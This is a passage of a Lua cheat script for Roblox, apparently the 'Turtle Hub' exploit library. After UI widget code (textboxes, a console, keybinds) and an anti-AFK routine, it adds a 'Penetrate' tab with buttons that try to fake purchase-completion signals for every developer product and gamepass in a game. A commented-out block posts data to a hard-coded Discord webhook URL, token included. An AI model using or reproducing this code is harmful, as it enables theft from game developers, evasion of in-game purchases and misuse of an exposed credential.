                            pcall(callback,TextBox.Text)
                            if disapper then
                                TextBox.Text = ""
                            end
                        end
                    end
                end
            )

		if limit ~= "no limits" then
			TextboxTitle.Text = `{text} ({limit} left)`
			lib.getElementChanged(TextBox,"Text",function()
				if #TextBox.Text < limit then
					TextboxTitle.Text = `{text} ({limit - #TextBox.Text} left)`
				elseif #TextBox.Text > limit then
					TextboxTitle.Text = `{text} (0 left)`
					TextBox.Text = `{text:sub(1,limit)}`
				end
			end)
		end
			
	    function tablehandler:GetInputChanged(get)
		lib.getElementChanged(TextBox,"Text",function()
			pcall(get,TextBox.Text)
		end)
	    end

	    function tablehandler:GetInputOnEnter(get)
		TextBox.FocusLost:Connect(function(enter)
			if enter then
				if #TextBox.Text > 0 then
					pcall(get,TextBox.Text)
				end
			end
		end)
	    end
			
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
	    return tablehandler
        end
	function tabcontent:Console(disapper, callback)
            local Textbox = Instance.new("Frame")
            local TextboxCorner = Instance.new("UICorner")
            local TextboxTitle = Instance.new("TextLabel")
            local TextboxFrame = Instance.new("Frame")
            local TextboxFrameCorner = Instance.new("UICorner")
            local TextBox = Instance.new("TextBox")
	    local sizevar = {-0.8,187,-0.8,42}
			
            Textbox.Name = "Textbox"
            Textbox.Parent = Tab
            Textbox.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Textbox.ClipsDescendants = true
            Textbox.Position = UDim2.new(-0.541071415, 0, -0.532915354, 0)
            Textbox.Size = UDim2.new(0, 363, 0, 42)

            TextboxCorner.CornerRadius = UDim.new(0, 5)
            TextboxCorner.Name = "TextboxCorner"
            TextboxCorner.Parent = Textbox

            TextboxTitle.Name = "TextboxTitle"
            TextboxTitle.Parent = Textbox
            TextboxTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextboxTitle.BackgroundTransparency = 1.000
            TextboxTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            TextboxTitle.Size = UDim2.new(0, 187, 0, 42)
            TextboxTitle.Font = Enum.Font.Gotham
            TextboxTitle.Text = ""
            TextboxTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextboxTitle.TextSize = 14.000
            TextboxTitle.TextXAlignment = Enum.TextXAlignment.Left
            TextboxTitle.RichText = true
	    TextboxTitle.Visible = true
			
            TextboxFrame.Name = "TextboxFrame"
            TextboxFrame.Parent = TextboxTitle
            TextboxFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
            TextboxFrame.Position = UDim2.new(1.28877008, 0, 0.214285716, 0)
            TextboxFrame.Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4]) --UDim2.new(0, 100, 0, 23)

            TextboxFrameCorner.CornerRadius = UDim.new(0, 5)
            TextboxFrameCorner.Name = "TextboxFrameCorner"
            TextboxFrameCorner.Parent = TextboxFrame

            TextBox.Parent = TextboxFrame
            TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.BackgroundTransparency = 1.000
            TextBox.Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])
            TextBox.Font = Enum.Font.Gotham
            TextBox.Text = ""
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 14.000

            TextBox.FocusLost:Connect(
                function(ep)
                    if ep then
                        if #TextBox.Text > 0 then
                            if disapper then
				TextBox.Text = ""
			    end
				if TextBox.Text:sub(1,8) == "#size_1 " then
					sizevar[1] = TextBox.Text:sub(9)
					TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
				elseif TextBox.Text:sub(1,8) == "#size_2 " then
					sizevar[2] = TextBox.Text:sub(9)
					TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
				elseif TextBox.Text:sub(1,8) == "#size_3 " then
					sizevar[3] = TextBox.Text:sub(9)
					TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
				elseif TextBox.Text:sub(1,8) == "#size_4 " then
					sizevar[4] = TextBox.Text:sub(9)
					TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
				elseif TextBox.Text:sub(1,12) == "#reset_size " then
					if TextBox.Text:sub(13) == "1" then
						sizevar[1] = -0.8
						TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
						TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					elseif TextBox.Text:sub(13) == "2" then
						sizevar[2] = 187
						TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
						TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					elseif TextBox.Text:sub(13) == "3" then
						sizevar[3] = -0.8
						TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
						TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					elseif TextBox.Text:sub(13) == "4" then
						sizevar[4] = 42
						TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
						TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					elseif TextBox.Text:sub(13) == "all" then
						sizevar[1] = -0.8
						sizevar[2] = 187
						sizevar[3] = -0.8
						sizevar[4] = 42
						TweenService:Create(TextBox,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
						TweenService:Create(TextboxFrame,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.Out,0,false,0),{Size = UDim2.new(sizevar[1],sizevar[2],sizevar[3],sizevar[4])}):Play()
					end
				else
					pcall(callback, TextBox.Text)
				end
                        end
                    end
                end
            )
            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)
        end
        function tabcontent:Bind(text, keypreset, callback, descToggle)
            local binding = false
            local Key = keypreset.Name
            local Bind = Instance.new("TextButton")
            local BindCorner = Instance.new("UICorner")
            local BindTitle = Instance.new("TextLabel")
            local BindText = Instance.new("TextLabel")

            Bind.Name = "Bind"
            Bind.Parent = Tab
            Bind.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
            Bind.Size = UDim2.new(0, 363, 0, 42)
            Bind.AutoButtonColor = false
            Bind.Font = Enum.Font.SourceSans
            Bind.Text = ""
            Bind.TextColor3 = Color3.fromRGB(0, 0, 0)
            Bind.TextSize = 14.000

            BindCorner.CornerRadius = UDim.new(0, 5)
            BindCorner.Name = "BindCorner"
            BindCorner.Parent = Bind

            BindTitle.Name = "BindTitle"
            BindTitle.Parent = Bind
            BindTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BindTitle.BackgroundTransparency = 1.000
            BindTitle.Position = UDim2.new(0.0358126722, 0, 0, 0)
            BindTitle.Size = UDim2.new(0, 187, 0, 42)
            BindTitle.Font = Enum.Font.Gotham
            BindTitle.Text = text
            BindTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
            BindTitle.TextSize = 14.000
            BindTitle.TextXAlignment = Enum.TextXAlignment.Left
            BindTitle.RichText = true
			
            local ToggleDesc = Instance.new("TextLabel")
	    ToggleDesc.Name = "BindDesc"
            ToggleDesc.Parent = Bind
            ToggleDesc.BackgroundColor3 = Color3.fromRGB(255,255,255)
            ToggleDesc.BackgroundTransparency = 1.000
            ToggleDesc.Position = UDim2.new(0.0358126722,0,0.160,0)
            ToggleDesc.Size = UDim2.new(0,187,0,42)
            ToggleDesc.Font = Enum.Font.Gotham
            ToggleDesc.Text = ""
            ToggleDesc.TextColor3 = Color3.fromRGB(255, 255, 255)
            ToggleDesc.TextSize = 12.000
            ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
            ToggleDesc.RichText = true
	    ToggleDesc.Visible = false

	    TurtleFlags[text .. " desc"] = function(descName)
		if typeof(descName) ~= "nil" then
			ToggleDesc.Visible = true
			TweenService:Create(BindTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
			if typeof(descName) == "string" or typeof(descName) == "number" then
				ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
				--TweenService:Create(Toggle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.215625003,0,0.446271926,TabLayout.AbsoluteContentSize.Y)}):Play()
				if descName ~= "" then
					TweenService:Create(BindTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,-0.160,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				else
					TweenService:Create(BindTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
				end
			else
				task.spawn(function()
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts("Only accept A-Z, a-z & 0-9 not a " .. typeof(descName),TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
					wait(1)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
					wait(0.3)
					ToggleDesc.Text = lib:ColorFonts(descName,TurtleFlags.DescTextStyle)
					TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
				end)
			end
		else
			TweenService:Create(BindTitle,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out,0,false,0),{Position = UDim2.new(0.0358126722,0,0,0)}):Play()
			TweenService:Create(ToggleDesc,TweenInfo.new(0.3,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{TextTransparency = 1}):Play()
		end
	    end

	    TurtleFlags[text .. " desc"](descToggle)
            BindText.Name = "BindText"
            BindText.Parent = Bind
            BindText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            BindText.BackgroundTransparency = 1.000
            BindText.Position = UDim2.new(0.0358126722, 0, 0, 0)
            BindText.Size = UDim2.new(0, 337, 0, 42)
            BindText.Font = Enum.Font.Gotham
            BindText.Text = Key
            BindText.TextColor3 = Color3.fromRGB(255, 255, 255)
            BindText.TextSize = 14.000
            BindText.TextXAlignment = Enum.TextXAlignment.Right

            Tab.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y)

            Bind.MouseButton1Click:Connect(
                function()
                    BindText.Text = "..."
                    binding = true
                    local inputwait = game:GetService("UserInputService").InputBegan:wait()
                    if inputwait.KeyCode.Name ~= "Unknown" then
                        BindText.Text = inputwait.KeyCode.Name
                        Key = inputwait.KeyCode.Name
                        binding = false
                    else
                        binding = false
                    end
                end
            )

            game:GetService("UserInputService").InputBegan:connect(
                function(current, pressed)
                    if not pressed then
                        if current.KeyCode.Name == Key and binding == false then
                            pcall(callback)
                        end
                    end
                end
            )
        end
        return tabcontent
    end
    return tabhold
end

local isafk = {
	s = 0,
	m = 0,
	h = 0,
	d = 0,
	bool = false
}

LocalPlayer.Idled:connect(function()
	VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	wait(1)
	VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

UserInputService.InputBegan:Connect(function(input)
	if isafk.bool == true then
		isafk.bool = false
		wait(3)
		CloseWarnInterface()
	end
end)

--[[
local args = {
    [1] = {
        ["heroGuid"] = "3acd6428-3b5f-428a-91ea-398b464fc223",
        ["attackType"] = 1,
        ["userId"] = 3621188307,
        ["enemyGuid"] = "2ac06468-57be-422d-915b-c9d6e0252769"
    }
}

game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer(unpack(args))
local player = Players:GetPlayerByUserId(message.TextSource.UserId)

]]


	--[[ActivateHighlight = Mouse.Move:Connect(HighlightPart)
local function SelectPart()
	if Mouse.Target ~= nil then
		selected.Adornee = Mouse.Target
		updateText(Path,getHierarchy(Mouse.Target))
	end
end
	ClickSelect = Mouse.Button1Down:Connect(SelectPart)

	
addEventListener(Exit_4,"MouseButton1Down",function()
	if ActivateHighlight then
		ActivateHighlight:Disconnect()
	end
	if ClickSelect then
		ClickSelect:Disconnect()
	end
	selectionBox.Adornee = nil
	selected.Adornee = nil
	updateText(Path,"")
	Interface_Visible(Exit_4, false)
        Interface_Visible(CopyPath, false)
        Interface_Visible(ChoosePart, false)
        Interface_Visible(Path, false)
	--fuckingFrame.Visible = false
end)

--https://discord.com/api/webhooks/1241031789997330483/GkDMMq6BwtOYgf80ioPP53pB8UIR-QOcvFHbclUYPnV7pugW0DJfOcqQJnRnhawewRCJ
addEventListener(CopyPath,"MouseButton1Down",function()
	if Path.Text ~= "" then
		copy(Path.Text)
		local response = httprequest({
			Url = "https://discord.com/api/webhooks/1241031789997330483/GkDMMq6BwtOYgf80ioPP53pB8UIR-QOcvFHbclUYPnV7pugW0DJfOcqQJnRnhawewRCJ",
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode({["content"] = Path.Text})
		})
	else
		ErrorPrompt("Copy part",'Select a part to copy its path')
	end
end)

addEventListener(ChoosePart,"MouseButton1Down",function()
	if Path.Text ~= "" then
		local tpNameExt = ''
		local function handleWpNames()
			local FoundDupe = false
			for i,v in pairs(InterfaceCoordFunction) do
				if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
					FoundDupe = true
				end
			end
			if not FoundDupe then
				InterfaceCoordFunction[#InterfaceCoordFunction + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
				notify("Select Part","Created waypoint: "..selected.Adornee.Name..tpNameExt)
					
			else
				if isNumber(tpNameExt) then
					tpNameExt = tpNameExt+1
				else
					tpNameExt = 1
				end
				handleWpNames()
			end
		end
		handleWpNames()
		RefreshInterface()
	else
		ErrorPrompt("Select Part",'Select a part first')
	end
end)
]]

function lib:sendChat(msg)
        if Chat:FilterStringForBroadcast(msg,LocalPlayer) ~= msg then
            lib:notify(lib:ColorFonts("Message is filtered.","Bold,Red"),10)
        else
	    if TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
		if #msg > 200 then
			TurtleScreenNotify("Turtle Hub | Character Limit","Your character limit has exceeded the limit\nLimit : 200\n\nYour message text has been truncated from 1 to 200 characters",{},nil,{})
			game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer(msg:sub(1,200),"All")
		else
			game:GetService("ReplicatedStorage")["DefaultChatSystemChatEvents"]["SayMessageRequest"]:FireServer(msg,"All")
		end
	    else
		if #msg > 1000 then
			TurtleScreenNotify("Turtle Hub | Character Limit","Your character limit has exceeded the limit\nLimit : 1000\n\nYour message text has been truncated from 1 to 1000 characters",{},nil,{})
			TextChatService["ChatInputBarConfiguration"]["TargetTextChannel"]:SendAsync(msg:sub(1,1000))
		else
			TextChatService["ChatInputBarConfiguration"]["TargetTextChannel"]:SendAsync(msg)
		end -- character count
	    end
        end
end

--turtle.sys.isTurtleExploit() == true
function lib.DeveloperEncrypt(window,isShowed)
	local hidetab = isShowed or false
	local hacking = window:Tab("Penetrate",false)
	hacking:Button("Penetrate all DevProducts purchase",function()
		if TurtleScreenNotify then -- require turtle exploit to use this
			local currentPage = 1
			local decodedResponse = nil
			TurtleScreenNotify("Purchase Penetrate","Penetrating the purchase methods...\nPls wait 3s, this may take a while...",{},3,{})
			repeat wait()
				decodedResponse = HttpService:JSONDecode(game:HttpGet("https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. tostring(game.GameId) .. "&page=" .. tostring(currentPage)))
				for i,v in pairs(decodedResponse.DeveloperProducts) do
					lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.ProductId .. ',true)')
				end
				currentPage = currentPage + 1
			until decodedResponse.FinalPage
			TurtleScreenNotify("Purchase Penetrate","Penetrated successfully.",{},2,{})
		else
			lib:notify(lib:ColorFonts("Your exploit doesnt support 'turt' library.\npls switch to 'Turtle Software' to use this.","Bold,Red"),10)
		end
	end)

	hacking:Button("Penetrate all gamepass purchase",function()
		if TurtleScreenNotify then -- require turtle exploit to use this
			TurtleScreenNotify("Purchase Penetrate","Penetrating the purchase methods...\nPls wait 2s, this may take a while...",{},2,{})
			for i,v in pairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.GameId .. "/game-passes?limit=100&sortOrder=1")).data) do
				lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.id .. ',true)')
			end
			TurtleScreenNotify("Purchase Penetrate","Penetrated successfully.",{},2,{})
		end
	end)
	hacking:Button("Bypass DevProducts Purchase [ WORKING ] [ Required Turtle Exploit ]",function()
		if TurtleScreenNotify then -- require turtle exploit to use this
			if (turtle and turtle.sys and turtle.sys.isTurtleExploit() == true) then
				local currentPage = 1
				local decodedResponse = nil
				TurtleScreenNotify("Purchase Bypasser","Bypassing the purchase methods...\nPls wait 3s, this may take a while...",{},3,{})
				repeat wait()
					decodedResponse = HttpService:JSONDecode(game:HttpGet("https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. tostring(game.GameId) .. "&page=" .. tostring(currentPage)))
					for i,v in pairs(decodedResponse.DeveloperProducts) do
						lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.ProductId .. ',true)')
						lib:BypassPurchase('game:GetService("MarketplaceService"):PromptPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.ProductId .. ',true)')
						lib:BypassPurchase('game:GetService("MarketplaceService"):PromptGamePassPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.ProductId .. ',true)')
						lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer,' .. v.ProductId .. ',true)')
						lib:BypassPurchase('game:GetService("MarketplaceService"):PromptPurchaseFinished(game.Players.LocalPlayer,' .. v.ProductId .. ',true)')
						lib:BypassPurchase('game:GetService("MarketplaceService"):PromptGamePassPurchaseFinished(game.Players.LocalPlayer,' .. v.ProductId .. ',true)')
					end
					currentPage = currentPage + 1
				until decodedResponse.FinalPage
				TurtleScreenNotify("Purchase Bypasser","Bypass successfully.",{},2,{})
			else
				TurtleScreenNotify("Bypass Failed",'Failed to bypass server, turtle exploit required.\n\nattempt to call a nil function "turtle.sys.serverInject", turtle exploit expected.',{},nil,{})
			end
		else
			lib:notify(lib:ColorFonts("Your exploit doesnt support 'turt' library.\npls switch to 'Turtle Software' to use this.","Bold,Red"),10)
		end
	end)

	hacking:Button("Bypass Gamepass Purchase [ WORKING ] [ Required Turtle Exploit ]",function()
		if TurtleScreenNotify then -- require turtle exploit to use this
			if (turtle and turtle.sys and turtle.sys.isTurtleExploit() == true) then
				TurtleScreenNotify("Purchase Bypasser","Penetrating the purchase methods...\nPls wait 2s, this may take a while...",{},2,{})
				for i,v in pairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.GameId .. "/game-passes?limit=100&sortOrder=1")).data) do
					lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.id .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):PromptPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.id .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):PromptGamePassPurchaseFinished(game.Players.LocalPlayer.UserId,' .. v.id .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer,' .. v.id .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):PromptPurchaseFinished(game.Players.LocalPlayer,' .. v.id .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):PromptGamePassPurchaseFinished(game.Players.LocalPlayer,' .. v.id .. ',true)')
				end
				TurtleScreenNotify("Purchase Bypasser","Successfully bypassed.",{},2,{})
			else
				TurtleScreenNotify("Bypass Failed",'Failed to bypass server, turtle exploit required.\n\nattempt to call a nil function "turtle.sys.serverInject", turtle exploit expected.',{},nil,{})
			end
		else
			lib:notify(lib:ColorFonts("Your exploit doesnt support 'turt' library.\npls switch to 'Turtle Software' to use this.","Bold,Red"),10)
		end
	end)
	--[[local Tab01 = window:Tab("DevProducts",false)
	local api = HttpService:JSONDecode(game:HttpGet("https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. game.GameId .. "&page=1"))
	local dnames = {}
	local dproductIds = {}
	if type(api.DeveloperProducts) == nil then
		table.insert(dnames," ")
	end

	pcall(function()
		local currentPage = 1
		repeat
			local response = game:HttpGet("https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" .. tostring(game.GameId) .. "&page=" .. tostring(currentPage))
			local decodedResponse = HttpService:JSONDecode(response)
			local developerProducts = decodedResponse.DeveloperProducts
			print("Page " .. currentPage .. ":")
			for _,developerProduct in pairs(developerProducts) do
				table.insert(dnames,developerProduct.Name)
				table.insert(dproductIds,developerProduct.ProductId)
			end
			currentPage = currentPage + 1
		until decodedResponse.FinalPage
	end)

	local handle = {
		devprod = {
			index = 1,
			loop = false,
			loop2 = false
		},
		gamepass = {
			index = 1,
			loop = false,
			loop2 = false
		}
	}
	Tab01:Dropdown("Select DevProducts",dnames,function(value)
		for i,v in ipairs(dnames) do
			if v == value then
				handle.devprod.index = i
				break
			end
		end
	end)

	Tab01:Button("Bypass selected DevProduct purchase",function()
		pcall(function()
                    lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. dproductIds[handle.devprod.index] .. ',true)')
		    lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. dproductIds[handle.devprod.index] .. ')')
		    lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. dproductIds[handle.devprod.index] .. ')')
                end)
		lib:notify(lib:ColorFonts(lib:ColorFonts(`Purchase bypassed`,"Bold"),"Green"),10)
	end)

	Tab01:Toggle("Auto bypass selected DevProduct",false,function(value)
		handle.devprod.loop2 = value
		while wait() do
		if handle.devprod.loop2 == false then break end
			lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. dproductIds[handle.devprod.index] .. ',true)')
			lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. dproductIds[handle.devprod.index] .. ')')
			lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. dproductIds[handle.devprod.index] .. ')')
		end
	end)
	
	Tab01:Button("Bypass all DevProduct purchase",function()
		local starttickcc = tick()
		for i,product in pairs(dproductIds) do
			task.spawn(function()
				pcall(function()
					lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. product .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. product .. ')')
					lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. product .. ')')
				end)
			end)
			task.wait()
		end
		local endtickcc = tick()
		local durationxd = endtickcc - starttickcc
		lib:notify(lib:ColorFonts(lib:ColorFonts(`Successfully bypassed in {durationxd} seconds`,"Bold"),"Green"),10)
	end)
	
	Tab01:Toggle("Auto bypass all purchase signals",false,function(value)
		handle.devprod.loop = value
		while wait() do
		if handle.devprod.loop == true then break end
			for i,product in pairs(dproductIds) do
				lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. product .. ',true)')
				lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. product .. ')')
				lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. product .. ')')
			end
		end
	end)

	local Tab02 = window:Tab("Gamepass",false)
	local gp = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.GameId .. "/game-passes?limit=100&sortOrder=1"))
	local gnames = {}
	local gproductIds = {}
	for i,v in pairs(gp.data) do 
		table.insert(gnames,v.name)
		table.insert(gproductIds,v.id)
	end

	Tab02:Dropdown("Select gamepass",gnames,function(value)
		for i,v in ipairs(gnames) do
			if v == value then
				handle.gamepass.index = i
				break
			end
		end
	end)

	Tab02:Button("Bypass selected gamepass purchased",function()
		pcall(function()
                    lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. gproductIds[handle.gamepass.index] .. ',true)')
		    lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. gproductIds[handle.gamepass.index] .. ')')
		    lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. gproductIds[handle.gamepass.index] .. ')')
                end)
		lib:notify(lib:ColorFonts(lib:ColorFonts(`Purchase bypassed`,"Bold"),"Green"),10)
	end)

	Tab02:Toggle("Auto bypass selected gamepass",false,function(value)
		handle.gamepass.loop = value
		while wait() do
		if handle.gamepass.loop == false then break end
			lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. gproductIds[handle.gamepass.index] .. ',true)')
			lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. gproductIds[handle.gamepass.index] .. ')')
			lib:BypassPurchase('game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId,' .. gproductIds[handle.gamepass.index] .. ')')
		end
	end)

	Tab02:Button("Bypass all gamepass purchase",function()
		local starttickcc = tick()
		for i,pass in pairs(gproductIds) do
			task.spawn(function()
				pcall(function()
					lib:BypassPurchase('game:GetService("MarketplaceService"):SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId,' .. pass .. ',true)')
					lib:BypassPurchase('game:GetService("MarketplaceService"):PlayerOwnsAsset(game.Players.LocalPlayer.UserId,' .. pass .. ')')
